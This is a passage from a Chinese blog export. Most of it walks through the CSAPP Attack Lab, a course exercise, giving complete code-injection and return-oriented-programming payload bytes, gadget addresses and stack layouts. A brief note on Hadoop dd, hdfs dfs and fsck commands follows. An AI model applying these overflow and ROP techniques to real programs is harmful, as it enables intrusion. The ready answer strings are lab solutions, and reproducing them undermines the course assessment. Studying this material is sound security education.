exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	我们可以先考虑一下这个和Level 2有什么不同，首先就要注入的代码而言，因为这里的参数是个地址，所以我们暂时还不知道参数在哪，剩下的基本都是一样的，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ?, %rdi # ?是一个地址，是字符串的位置</span><br><span class="line">pushq $0x4018fa # 0x4018fa是touch3的开始地址</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>​	所以接下来我们需要考虑一下要把这个字符串存到哪个地址。事实上，我们注意到了在<code>hexmatch</code>函数中有一个随机数，所以如果把字符串放到<code>touch3</code>的栈帧里，是肯定很容易被覆盖掉的，所以我们考虑将其放到<code>test</code>函数的栈帧上，一样的查看<code>test</code>函数的栈底地址，发现是<code>0x5561dca8</code>，其实准确来说应该是<code>0x5561dca0</code>，但是我们这个位置已经被覆盖了，所以我们需要再往上走。</p>
<p>​	所以最终的答案应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 </span><br></pre></td></tr></table></figure>
<p>​	这个过程中的栈如图所示。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220327200753701.png" alt="image-20220327200753701"></p>
<h1>Part 2</h1>
<p>​	在这一部分，由于代码加入了随机生成栈以及访问权限，原本的代码注入攻击就用不了了，但是我们可以用一些别的方法，具体来说就是这里所用到的ROP，也就是通过程序中已有的一些指令组合出自己想要的指令。</p>
<h2 id="Level-2-v2"><a class="header-anchor" href="#Level-2-v2">¶</a>Level 2</h2>
<p>​	这里我们要做的和Part 1的Level 2一样，也就是说，所需要的操作还是把<code>cookie</code>赋给寄存器<code>%rdi</code>，然后把<code>touch2</code>函数压到栈里。所以我们的想法大致是这样的：利用缓冲区溢出，把原本的返回地址覆盖成一条<code>pop</code>，然后随后是<code>cookie</code>，再往后是<code>mov</code>指令，再往后是<code>touch</code>的地址，那么我们就得考虑一下这里要用哪一部分的指令了，先看一下这几个函数的反汇编。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:       b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:       c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:       c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:       c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:       c3                      retq</span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​	然后再看一下官方文档里面给出的编码</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220327220701062.png" alt="image-20220327220701062"></p>
<p>​	然后我们需要寄存器<code>%rdi</code>，参考上图可知需要<code>48 89 ??</code>这种格式的，然后结合后面的<code>pop</code>指令，可知另外一个寄存器选择<code>%rax</code>是最合适的，最终我们可以选择<code>addval_273</code>和<code>addval_219</code>，相应的地址就是<code>0x4019a2</code>和<code>0x4019ab</code></p>
<p>​	因此，这一题最终的答案如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>​	栈帧变化如图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220330092727890.png" alt="image-20220330092727890"></p>
<h2 id="Level-3-v2"><a class="header-anchor" href="#Level-3-v2">¶</a>Level 3</h2>
<p>​	这里要做的和上面Part1部分的Level 3一致，但是难度会更大，我们先放出相关函数的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	回忆一下，在上面那个Level 3，由于担心我们的字符串被新的函数栈帧覆盖，所以我们将字符串放到了<code>test</code>函数的栈帧里。但是在这里我们不能这样做，因为这里开启了栈随机化，我们不能再简单地用绝对地址进行读取，而是要选取一个地址作为基准，在上面增加一个偏移量<code>bias</code></p>
<p>​	这里看一下材料中给出的相关的机器指令</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220330084217412.png" alt="image-20220330084217412"></p>
<p>​	当然在上面的Level 2也给出了一些指令。现在我们需要找的就是一个可以用来计算的指令，比如<code>lea</code>或者<code>add</code>，看一下反汇编，在<code>0x4019d6</code>位置发现了这样一条指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4019d6:       48 8d 04 37             lea   (%rdi,%rsi,1),%rax</span><br></pre></td></tr></table></figure>
<p>​	这里其实就可以作为地址计算了，即<code>%rax=%rdi+%rsi</code>，那我们现在就需要找点办法，可以让寄存器<code>%rdi</code>和<code>%rsi</code>中存放我们想要的值。</p>
<p>​	假定，我们考虑把<code>%rsp</code>放到<code>%rdi</code>里，把偏移地址放到<code>%rsi</code>里，根据之前的讨论，为了防止字符串被覆盖，我们还是需要把它放到<code>test</code>函数的栈帧里，那我们就继续在反汇编里查找我们需要的指令。</p>
<p>​	经过查找最终的答案应该如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00 # movq %rsp,%rax</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">cc 19 40 00 00 00 00 00 # pop %rax</span><br><span class="line">48 00 00 00 00 00 00 00 # 将0x48写入栈帧，就是bias，通过指令数目计算得到的</span><br><span class="line">dd 19 40 00 00 00 00 00 # movl %eax,%edx </span><br><span class="line">70 1a 40 00 00 00 00 00 # movl %edx,%ecx</span><br><span class="line">13 1a 40 00 00 00 00 00 # movl %ecx,%esi</span><br><span class="line">d6 19 40 00 00 00 00 00 # lea (%rdi,%rsi,1),%rax</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00 # touch3</span><br><span class="line">35 39 62 39 39 37 66 61 00 # cookie</span><br></pre></td></tr></table></figure>
<p>​	这整个查找的过程也蛮复杂的，主要是因为最开始想着直接查<code>movq</code>这种指令，发现一直没有，后来就用<code>movl</code>去查，还要用寄存器来回做几次中转，最终的栈帧大概和下面一样</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220330093106410.png" alt="image-20220330093106410"></p>
]]></content>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop常用命令记录</title>
    <url>/2022/03/26/hadoop%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1>HDFS</h1>
<h2 id="dd"><a class="header-anchor" href="#dd">¶</a>dd</h2>
<p>​	我本以为这是HDFS专有的命令。后来查了一下发现竟然是Linux下也有的命令，真是功夫不到家。</p>
<p>​	其实是一个拷贝的命令，常用的参数如下</p>
<ul>
<li><code>if</code>=文件名：输入文件名，默认为标准输入。即指定源文件。</li>
<li><code>of</code>=文件名：输出文件名，默认为标准输出。即指定目的文件。</li>
<li><code>ibs</code>=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。<br>
<code>obs</code>=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。<br>
<code>bs</code>=bytes：同时设置读入/输出的块大小为bytes个字节。</li>
<li><code>cbs</code>=bytes：一次转换bytes个字节，即指定转换缓冲区大小。</li>
<li><code>skip</code>=blocks：从输入文件开头跳过blocks个块后再开始复制。</li>
<li><code>seek</code>=blocks：从输出文件开头跳过blocks个块后再开始复制。</li>
<li><code>count</code>=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。</li>
<li><code>conv</code>=&lt;关键字&gt;，常用关键字有下面这几个：
<ul>
<li><code>block</code>：把每一行转换为长度为cbs，不足部分用空格填充</li>
<li><code>unblock</code>：使每一行的长度都为cbs，不足部分用空格填充</li>
<li><code>lcase</code>：把大写字符转换为小写字符</li>
<li><code>ucase</code>：把小写字符转换为大写字符</li>
<li><code>noerror</code>：出错时不停止</li>
<li><code>notrunc</code>：不截短输出文件</li>
<li><code>sync</code>：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。</li>
</ul>
</li>
</ul>
<p>​    这么一看这个命令其实还蛮有用的</p>
<h2 id="hdfs-dfs-xx"><a class="header-anchor" href="#hdfs-dfs-xx">¶</a>hdfs dfs -xx</h2>
<p>​	其实相比于Linux，在hdfs里创建文件的命令特征就是原本的Linux命令作为参数出现，前面需要加上<code>hdfs dfs</code>，比如</p>
<ul>
<li><code>hdfs dfs -mkdir /test</code>：创建/test目录</li>
<li><code>hdfs dfs -put /本地路径 /hdfs路径</code>：上传本地文件到hdfs</li>
<li><code>hdfs dfs -ls /test</code>：显示hdfs的/test目录下所有文件</li>
</ul>
<h2 id="fsck"><a class="header-anchor" href="#fsck">¶</a>fsck</h2>
<p>​	这个命令主要是查看文件是否健康，模式如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs fsck &lt;path&gt; [-list-corruptfileblocks | [-move | -delete | -openforwrite] [-files [-blocks [-locations | -racks]]]] [-includeSnapshots] [-storagepolicies] [-blockId &lt;blk_Id&gt;]</span><br></pre></td></tr></table></figure>
<p>​	还是就说一点常用的参数吧</p>
<ul>
<li><code>path</code>：文件路径</li>
<li><code>-files</code>：检查并列出所有文件的状态</li>
<li><code>-blocks</code>：查看一个指定文件的所有的Block详细信息，需要和<code>-files</code>一起使用</li>
<li><code>replicaDetails</code>：</li>
</ul>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
</search>
